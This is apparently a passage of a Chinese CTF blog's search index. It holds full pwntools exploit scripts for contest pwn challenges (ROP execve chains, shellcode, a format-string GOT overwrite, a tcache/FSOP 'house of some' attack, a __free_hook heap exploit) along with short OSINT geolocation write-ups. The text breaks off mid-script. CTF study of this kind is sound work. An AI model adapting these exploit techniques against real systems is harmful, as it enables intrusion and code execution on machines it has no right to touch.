p64(rsi) + p64(0x460000+0x800)pay += p64(syscall)pay += b'A' * 104pay += p64(rax) + p64(0x3b)pay += p64(rdi) + p64(0x460000+0x800)pay += p64(rsi) + p64(0)pay += p64(rcx) + p64(0)pay += p64(mov_rdx_rcx)pay += p64(syscall)pause()s(pay)#pause()sl('/bin/sh\\x00')#io.interactive()‍‍‍​​‍‍‍(🩸)[进阶]Bug_Zapper_Pro+from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './bugzapper_pro'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''continue'''.format(**locals())sc  ='''push ebxpush ebxpush rax'''# pwndbg&gt; si# 0x0000000114514fe0 in ?? ()# LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA# ──────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────# RAX  0x114514fe0 ◂— nop  /* 0x9090909090909090 */# RBX  0x0# RCX  0x0# RDX  0x0# RDI  0x0# RSI  0x0# R8   0x0# R9   0x0# R10  0x0# R11  0x0# R12  0x0# R13  0x0# R14  0x0# R15  0x0# RBP  0x0# *RSP  0x7ffdad853ee8 —▸ 0x4010fb (end) ◂— mov rdi, 1# *RIP  0x114514fe0 ◂— nop  /* 0x9090909090909090 */# ───────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────# ► 0x114514fe0    nop  # 0x114514fe1    nop  # 0x114514fe2    nop  # 0x114514fe3    nop  # 0x114514fe4    nop  # 0x114514fe5    nop  # 0x114514fe6    nop  # 0x114514fe7    nop  # 0x114514fe8    nop  # 0x114514fe9    nop  # 0x114514fea    nop  # ────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────# 00:0000│ rsp 0x7ffdad853ee8 —▸ 0x4010fb (end) ◂— mov rdi, 1# 01:0008│     0x7ffdad853ef0 ◂— 0x1# 02:0010│     0x7ffdad853ef8 —▸ 0x7ffdad854386 ◂— './bugzapper_pro'# 03:0018│     0x7ffdad853f00 ◂— 0x0# 04:0020│     0x7ffdad853f08 —▸ 0x7ffdad854396 ◂— 'COLORTERM=truecolor'# 05:0028│     0x7ffdad853f10 —▸ 0x7ffdad8543aa ◂— 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus'# 06:0030│     0x7ffdad853f18 —▸ 0x7ffdad8543dd ◂— 'DESKTOP_SESSION=ubuntu'# 07:0038│     0x7ffdad853f20 —▸ 0x7ffdad8543f4 ◂— 'DISPLAY=:0'# ──────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────# ► 0      0x114514fe0# 1         0x4010fb end# 2              0x1# 3   0x7ffdad854386# 4              0x0#io = remote('yuanshen.life',36747)io = process('./bugzapper_pro')io.recvuntil('&gt;&gt;&gt; ')#context.arch      = 'i386'#sc = '''#sub    al, 0x36#'''## '0x5e4a3c'## &gt;&gt;&gt; hex(0x514faa ^ 0x0f0596)##bd = b'\\x31\\x42\\x6b'#bd = b'\\x31\\x40\\x3e' # eax##bd = b'\\x31\\x70\\x6b' # esi##bd = b'\\x31\\x30'#sc = asm(sc) + bd#sc += asm('''#pop edx#push eax#pop esi#''')##sc += b'\\x5e\\x4a\\x3c'#sc += b'\\x54\\x40\\x39'[::-1]sc = bytes.fromhex('2c 36 31 40  3e 5a 50 5e  39 40 54'.replace(' ',''))print(disasm(sc))print(hexdump(sc))gdb.attach(io,'b *0x401098')s(sc)pause()#context.arch      = 'amd64'sc = '''mov rsi, 0x114514000xor rax,raxxor rdi,rdisyscalljmp rsi'''pay = asm(sc).rjust(0x4a,b'\\x90')s(pay)#pause()pay = asm(shellcraft.open('flag'))pay += asm(shellcraft.sendfile('1','rax',0,0x50))#pay = asm(shellcraft.sh())sl(pay)io.interactive()‍  只能使用 可见字符‍​​‍​​‍​​​​‍‍‍(🩸)overflow‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './overflow'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''b *0x401442'''.format(**locals())io = start(binary)io = remote('yuanshen.life',36365)#gdb.attach(io,'b *0x40132c')#pay =  + p64(0x401372) * 0x30#pay =  b'1111111122222222' +p64(0x401056) +p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000) * 0x10#pay =  b'1111111122222222' +b'B'*8 +p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000) * 0x10pay =  p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000+0x18) * 0x10#pay =  p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000+0x10) * 0x10sl(pay)io.interactive()‍‍(🩸)Eeeeasy_Cpp  本来几分钟就可以打下来的，奈何没有第一时间看到 backdoor 这个后门函数，  导致后面 本地环境可getshell ，远程死活不行，搞半年。from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote('yuanshen.life',35259)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''brva 0x002391continue'''.format(**locals())binary = './EeeeasyCpp'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)def get_(name,pwd):    ru('&gt;&gt; ')    sl('G')    ru('Enter your name: ')    sl(name)    ru('Enter your password: ')    sl(pwd)ru(\"I'll give you a gift: \")x = int(io.recvline(),16)elf_base = x - 0x02650bd = elf_base + 0x22E0target = elf_base + elf.got['strlen']ls(hex(elf_base))t1 = elf_base + 19784ls(hex(t1))get_('a1',b'\\x00'*0x18+p64(0x21)+p64(t1)+p64(target))get_(p64(bd),'1')io.interactive()‍‍(🩸)Bug_Zapperfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './bugzapper'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''continue'''.format(**locals())#for i in range(0x11):for i in range(0xb,0x11):    io = remote('yuanshen.life',34331)    sc = '''    xchg eax,esi    mov edx,esi    syscall    '''    sc = asm(sc)    #gdb.attach(io,'b *0x401092')    pay = sc    #io.interactive()    ru('&gt;&gt;&gt;')    s(pay+b'1'*i)    pause()    pay = b'\\x90'*0x10    pay += asm(shellcraft.sh())    sl(pay)    io.interactive()‍‍​​‍‍(🩸)Easy_SI‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)io = remote('yuanshen.life',33150)#pay = 'AAAAAAAA' + '%p%p%p%p%p%p'pay = '%p' * 0x30#0x401277 # stack_leak#0x400000 # elf_baselibc = ELF('./libc.so.6')print(''' # gcc -no-pie  # a.out[0x404018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7c80e50 (puts) ◂— endbr64[0x404020] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401040 ◂— endbr64[0x404028] printf@GLIBC_2.2.5 -&gt; 0x7ffff7c606f0 (printf) ◂— endbr64[0x404030] read@GLIBC_2.2.5 -&gt; 0x7ffff7d147d0 (read) ◂— endbr64''')pay  = b'%7$sAAAA'pay += p64(0x404018) # putsru('Welcome to SICTF and Do you like pwn?')ru(\"And now let's start the game!!!\\n\")s(pay)x = uu64(r(6))libc_base = x - libc.sym['puts']system = libc_base + libc.sym['system']lss('x')lss('libc_base')printf_got = 0x404018+0x18 # test offset printfpay = fmtstr_payload(6,{printf_got:system})ru(\"And now let's start the game!!!\\n\")s(pay)io.interactive()‍‍‍Forensice‍OSINT签到1.直接百度识图发现一样的地方，双击进去发现是红城湖公园​​​​‍树木的压迫‍1.百度搜图定位到达州凤凰山，放大图片很明显可以看出是一个体育场​​​​2.百度地图直接搜索达州体育就能冒出来达州市体育中心​​  查看相册确定就是这个地方SICTF{四川省_达州市_通川区_凤凰大道376号_达州市体育中心}‍‍真的签到‍  百度搜图和谷歌搜图都搜不到，使用抖音识图，发现第一个视频就是后面的摩天轮和商场的外观极度相似​​  现在需要确定是那个城市点开这个视频发现评论区的IP全部都是广东的​​3.根据作者的留言井岸大信摩天轮尝试搜索定位到海珠之星摩天轮并且就在大信新都汇旁边​​​​  SICTF{广东省_珠海市_斗门区_大信新都汇}​​‍这才是签到‍  谷歌识图可知国家是在意大利威尼斯​​  使用意大利威尼斯达涅利酒店谷歌地图搜索发现拍摄地点应该为Gondola Danieli​​  根据聊天记录可知，你再走过小道就找到我了得到最后的结果为 ChiesadiSanZaccaria最后的结果就是SICTF{意大利_威尼斯_GondolaDanieli_ChiesadiSanZaccaria}​​‍签退‍1.谷歌识图发现有一个B站的视频点进去看看发现红绿灯和图片上的一模一样并且视频中也有很多那种白色且窗户很多的大楼暂且定位为南非开普敦​​​​2.观察图片发现有一个类似于蜘蛛网的东西，并且马赛克还有红色的部分，可以联想到蜘蛛侠​​  搜索 cape town spider man第一个链接发现一个视频在视频中发现了一样的红绿灯和大楼并且发现一个店铺的名称 STEERS 和给的图片中的店铺后面几个字母一样​​​​  谷歌地图搜索开普敦 STEERS几个店铺一个一个看最终确定到这里最终的flag为 SICTF{南非_开普敦_StrandSt_STEERS}​​​​"
  },
  
  {
    "title": "2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps",
    "url": "/posts/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-01-26 00:00:00 +0800",
    





    
    "snippet": "‍  2023年春秋杯网络安全联赛冬季赛 ​pwn 方向 HouseofSome​ , 题解‍​​‍程序保护和沙箱​​​​‍菜单功能 泄露libc上的地址  ​scannf(\"%ldd\",&amp;xx)​ 传入 -​ 后面报错 会给出 libc上的地址​​​‍draw功能 任意地址写一个NULL 字节  通过上面泄露的_IO_2_1_stdin_​地址，我就基本上可以利用 draw​ 功能...",
    "content": "‍  2023年春秋杯网络安全联赛冬季赛 ​pwn 方向 HouseofSome​ , 题解‍​​‍程序保护和沙箱​​​​‍菜单功能 泄露libc上的地址  ​scannf(\"%ldd\",&amp;xx)​ 传入 -​ 后面报错 会给出 libc上的地址​​​‍draw功能 任意地址写一个NULL 字节  通过上面泄露的_IO_2_1_stdin_​地址，我就基本上可以利用 draw​ 功能在 libc可写的地方写入一个NULL字节，写到哪里呢？？‍  写 到 main_arena + 1 (add 一个堆块 保证 top_chunk 的低地址是 0x00)  需要爆破一点 保证 heap 地址起始是 heap_base &amp; 0xFFFF == 0x0000​​ ,然后攻击 main_arena+1​​ 的 位置 写 0x00 (利用 draw任意地址写 one null 字节， )      这样的话 top_chunk​ 就会指定 heap 的起始位置 也就是 tcachebins​ 结构体，下一次申请堆块的时候就可以 控制 tcachebins​ 结构体了，从而达到任意地址申请    攻击成功后 main_arena 地址就指向了 heap_base ， 也就是 修改了 top_chunk 的起始地址，申请的时候就会申请到 tcachebins 结构体上.控制 tcachebins 结构体  攻击 tcache结构体 ,控制链表数量和申请的地址​​任意读，任意写      首先利用 _IO_2_1_stdout_​ 泄露 environ​ 也就是栈地址        有了 stack地址 下一步就是利用 _IO_2_1_stdin_​ 任意地址写入， 在read 返回地址写 ORW_ROP  p *(struct _IO_FILE_plus *) &amp;_IO_2_1_stdout_p *(struct _IO_FILE_plus *) &amp;_IO_2_1_stdin_  攻击 _IO_2_1_stdout_​, _IO_2_1_stdin_​,fake_IO_FILE#  攻击 _IO_2_1_stdout_ 任意地址内容泄露environ = libc.sym['environ']pay = p64(0xFBAD1800) + p64(0) * 3 + p64(environ) + p64(environ+8)add(0x240,pay) stack = uu64(ru('1. ')) - 2408 + 0x18 # read 的返回地址lss('stack')#  攻击 _IO_2_1_stdin_ 任意地址写入内容pay = p64(0xfbad1800) + p64(0) * 6 + p64(stack) + p64(stack + 0x400)add(0x350,pay) 最后的利用脚本from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './houseofsome'libelf = './libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''brva 0x000163Abrva 0x000001875brva 0x1804#continue'''.format(**locals())for i in range(100):    #io = process(binary)    #io = process('./test/houseofsome')    io = remote('39.106.48.123', 33789)    def add(size,name,i=1):        ru('&gt; ')        sl((i-1)*'0' + '1')        ru('size&gt; ')        sl(str(size))        ru('name&gt; ')        sl(name)    def x_dev(dev):        ru('&gt; ')        sl('2')        ru('dev&gt; ')        sl(str(dev))    def draw(offset,l):        ru('&gt; ')        sl('3')        ru('offset&gt; ')        sl(str(offset))        ru('length&gt; ')        sl(str(l))    def show():        ru('&gt; ')        sl('4')    sl('-') ##    ru('invalid option ')    x = int(ru('.\\n'))    libc_base = x - 2095008 - 0x21000    lss('libc_base')    pay = p64(libc_base) * 0x40    libc = ELF('./libc.so.6')    libc.address = libc_base    read            = libc.sym['read']    setcontext      = libc.sym['setcontext']    _IO_2_1_stdout_ = libc.sym['_IO_2_1_stdout_']    _IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']     _IO_2_1_stderr_ = libc.sym['_IO_2_1_stderr_']     _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']    _IO_list_all =   libc.sym['_IO_list_all']    environ =   libc.sym['environ']       #pay  = p64(0) * 14    #pay += p64(0x414243) + p64(0x0000000100000000)    #pay = pay.ljust(0x100,b'\\x00')    ##pay += p64(0) * (64)    ##pay += p64(0x414243) + p64(0x0000000100000000)    ##pay = pay.ljust(0x2f0,b'\\x00')    #pay = pay * 0x20    #add(0x2000,pay)    #add(0x2000,pay)    #    add(0x380,'1234')    x_dev(2)#    target = libc_base + 2092288+0x21000 + 1# main_arena    #target = read    offset = target - 0x114514000    lss('libc_base')    lss('target')    lss('offset')    lss('_IO_2_1_stdout_')    #gdb.attach(io)    #    #add(0x3a0,b'\\x00'*(0x380-0x88)+p64(0x20031)+b'\\x00'*0x28+p64(0x20001))    #gdb.attach(io,gdbscript)    #gdb.attach(io)    draw(offset,1)    try:        #pay = flat({        #    0x00: 0,        #    0x46: 0x010001,        #    0x198: 0x114514000,        #    0x1a0:_IO_2_1_stdout_        #},filler=b\"\\x00\")        #pay = flat({        #    0x00: 0,        #    0x46: 0x010001,        #    0x198:_IO_2_1_stdout_+0x68,        #    0x1a0: 0x114514010        #},filler=b\"\\x00\")        pay = flat({            0x00: 0,            0x46: 0x01,            0x68: 0x01,            0x198:_IO_2_1_stdout_,            0x220:_IO_2_1_stdin_        },filler=b\"\\x00\")        # tcachebins        # 0x250 [  1]: 0x7ff31e1ff808 (_IO_2_1_stdout_+104) ◂— 0x7ff4e12e0b3f        # 0x360 [  1]: 0x114514010 ◂— 0x114514        # 0x390 [  0]: 0x51        add(0x230,pay)        sl('00')        ru('&gt; ')        lss('libc_base')        lss('target')        lss('offset')        lss('_IO_2_1_stdout_')        environ = libc.sym['environ']        pay = p64(0xFBAD1800) + p64(0) * 3 + p64(environ) + p64(environ+8)        add(0x240,pay) #  攻击 _IO_2_1_stdout_ 任意地址内容泄露        stack = uu64(ru('1. ')) - 2408 + 0x18        lss('stack')        pay = p64(0xfbad1800) + p64(0) * 6 + p64(stack) + p64(stack + 0x400)        #gdb.attach(io)        add(0x350,pay) #  攻击 _IO_2_1_stdin_ 任意地址写入内容        #栈上 ORW_ROP        pause()        ## ORW_ROP        libc_rop = ROP(libc)        rax = libc_rop.find_gadget(['pop rax','ret'])[0]        rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]        rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]        #rdx = libc_rop.find_gadget(['pop rdx','ret'])[0]        rdx = libc_base + 0x0000000000096272 #pop rdx ; or al, 0 ; ret        #rdx = libc_rop.find_gadget(['pop rdx','pop rbx','ret'])[0]        syscall = libc_rop.find_gadget(['syscall','ret'])[0]        orw_rop_addr = stack        orw_rop  = p64(rdx) + p64(0) + p64(rax) + p64(2) + p64(rdi) + p64(orw_rop_addr+0xb8) + p64(rsi) + p64(0) +  p64(syscall)        orw_rop += p64(rdx) + p64(0x100) + p64(rdi) + p64(4) + p64(rsi) + p64(orw_rop_addr+0xb8) + p64(libc.sym['read'])        orw_rop += p64(rdx) + p64(0x100) + p64(rdi) + p64(1) + p64(rsi) + p64(orw_rop_addr+0xb8) + p64(libc.sym['write'])        orw_rop += b'/flag'.ljust(0x10,b'\\x00')        sl(orw_rop)        io.interactive()    except:        io.close()        continue‍​​‍‍‍参考出题人博客的houseofsomehttps://blog.csome.cc/p/house-of-some/#FSOP%EF%BC%81​​"
  },
  
  {
    "title": "Announcements",
    "url": "/posts/Announcements/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-01-26 00:00:00 +0800",
    





    
    "snippet": "评论区  🍎  有什么想说的？",
    "content": "评论区  🍎  有什么想说的？"
  },
  
  {
    "title": "CISCN 2023 华东北赛区 AWDPlus pwn 题复现",
    "url": "/posts/CISCN-2023-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-AWDPlus-pwn-%E9%A2%98%E5%A4%8D%E7%8E%B0/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-01-23 00:00:00 +0800",
    





    
    "snippet": "‍  第十六届全国大学生信息安全竞赛—创新实践能力赛 华东北赛区‍‍‍minidb程序分析      heap pwn 第一步 写菜单        类似一个数据库， 可以，添加数据库，删除数据库，show 数据库…..  ​​‍  use_db() 里面还有一些操作​​  漏洞点在 use_db 里的 edit 功能里  18行 行可以输入 255 个字符串  19行测长度，21 虽然有长...",
    "content": "‍  第十六届全国大学生信息安全竞赛—创新实践能力赛 华东北赛区‍‍‍minidb程序分析      heap pwn 第一步 写菜单        类似一个数据库， 可以，添加数据库，删除数据库，show 数据库…..  ​​‍  use_db() 里面还有一些操作​​  漏洞点在 use_db 里的 edit 功能里  18行 行可以输入 255 个字符串  19行测长度，21 虽然有长度限制防止堆溢出  但是 在 20行  就已经使用 到 输入字符串的长度了，heap_addr + len + 0x10 = 0  如果堆块的大小是 0xa0, 而输入的是 0x100 ，这样的话很明显  可以将下面一个堆块的size 或内容 1字节清空，​​  比如修改 fd​​  漏洞找到了，后面就是堆风水了‍  libc 2.31 劫持 __free_hook​ 为 system​​​​​Break‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = 'minidb'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''continue'''.format(**locals())io = start(binary)def add_db(name,Type):    ru('Your choice: ')    sl('1')    ru('Please input the name of database: ')    sl(name)    ru(\"Please input the type of database: \")    sl(str(Type))def use_db(name):    ru('Your choice: ')    sl('2')    ru(\"Please input the name of database: \")    sl(name)def del_db(name):    ru('Your choice: ')    sl('3')    ru('Please input the name of database: ')    sl(name)def show_db():    ru('Your choice: ')    sl('4')def rename_db(name,new_name):    ru('Your choice: ')    sl('5')    ru(\"Please input the name of database: \")    sl(name)    ru(\"Please input the new name for database: \")    sl(new_name)def use_db_add(idx,data):    ru('Your choice: ')    sl('1')    ru('Input the key: ')    sl(str(idx))    ru('Input the value:')    sl(data)def use_db_show(idx):    ru('Your choice: ')    sl('2')    ru('Input the key: ')    sl(str(idx))def use_db_edit(idx,data):    ru('Your choice: ')    sl('3')    ru('Input the key: ')    sl(str(idx))    ru('Input the new value: ')    sl(data)def use_db_rm(idx):    ru('Your choice: ')    sl('4')    ru('Input the key: ')    sl(str(idx))def use_db_exit():    ru('Your choice: ')    sl('666')add_db('N'*0xa7,1)use_db('N'*0xa7)use_db_add(0,'A'*8)use_db_add(1,'B'*8)use_db_add(2,'C'*8)use_db_add(3,'D'*0x78+'\\xa1')use_db_rm(2)use_db_rm(1)use_db_edit(0,'T'*0x90)use_db_add(2,'X')use_db_add(0xa1,'Y')use_db_rm(3)use_db_rm(2)use_db_edit(0,'T'*0x78+'\\xa1')use_db_show(0xa1)ru(' is ')heap_addr = uu64(r(6))use_db_exit()add_db('text1',1)add_db('text2',1)add_db('text3',1)add_db('/bin/sh',1)del_db('text2')target = heap_addr + 144target1 = heap_addr + 2272use_db('N'*0xa7)use_db_edit(0xa1,p64(target))##use_db_add(10,'test1')use_db_add(0x21,b'A'*8+p64(target1)) # leak main_arenause_db_exit()show_db()ru('N\\n\\x09')main_arena = uu64(r(6))libc_base = main_arena - 2018272libc = elf.libc__free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']use_db('N'*0xa7)use_db_edit(0x21,b'A' *0x18+ p16(0x801))use_db_edit(0x21,b'A' *9+ p64(target1))use_db_edit(0x21,b'A' *8+ p64(target1))use_db_exit()use_db('/bin/sh')use_db_add(0,'A'*8)use_db_add(1,'B'*8)use_db_add(2,'C'*8)use_db_add(3,'D'*8)use_db_rm(2)use_db_rm(1)use_db_edit(0,'T'*0x90)use_db_add(10,'D'*0x18+'\\xa1')use_db_add(11,'D'*8)use_db_rm(3)use_db_rm(11)use_db_edit(10, b'T'*0x20+p64(__free_hook-0x10))use_db_add(21,'tt')use_db_add(22,p64(system))use_db_exit()lss('libc_base')lss('heap_addr')#gdb.attach(io,'brva 0x002340')del_db('/bin/sh')io.interactive()Fix  修复应该很简单直接这个 nop 掉 应该就没问题了​​‍  修复​​‍‍‍‍‍dbgnote  envp 知识点 LD_DEBUG=files​ LD_DEBUG=all​ 环境变量里有这些，运行时会有调试信息  劫持 tls 段 控制 exit​​ -&gt; __run_exit_handlers​​ -&gt; __call_tls_dtors​​ 里面的走向程序分析  main 函数处 buf 存在 一个bss 上的溢出，可以覆盖 下面的指针​​‍  四功能齐全，但是没有任何问题，此题可能不是打堆​​‍  gift 功能 泄露栈地址，具体什么用后面就知道了​​  dbg 模式​​‍  初始化函数，存在一个 可以触发 dbg 模式的 信号 6​​‍Break‍  程序基本就是上面那样，我也是跟着其他大佬的wp 做的，我们直接讲一下关键点‍  想要触发 dbg 模式 我们就需要 程序发出SIGABRT 6 ,  SIGABRT 6 的触发也就是由abort(3)发出的退出指令  什么可以触发abort(3) 呢？，没错 就是栈溢出。  SIGABRT 6 C 由abort(3)发出的退出指令‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''brva 0x01500'''.format(**locals())binary = './dbgnote'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary,['run'])#io = remote()nl = ['Note_Add','Note_Delete','Note_Write','Note_Read',b'++--++--']def login(name):    ru('UserName: ')    sl(name)def add(size,text):    ru('@Note $ ')    sl(nl[0])    ru('Size: ')    sl(str(size))    ru(\"Note: \")    s(text)def rm(idx):    ru('@Note $ ')    sl(nl[1])    ru(\"Index: \")    sl(str(idx))def edit(idx,text):    ru('@Note $ ')    sl(nl[2])    ru(\"Index: \")    sl(str(idx))    ru(\"Note: \")    sl(text)def show(idx):    ru('@Note $ ')    sl(nl[3])    ru(\"Index: \")    sl(str(idx))def gift(e=b'\\x00'):    ru('@Note $ ')    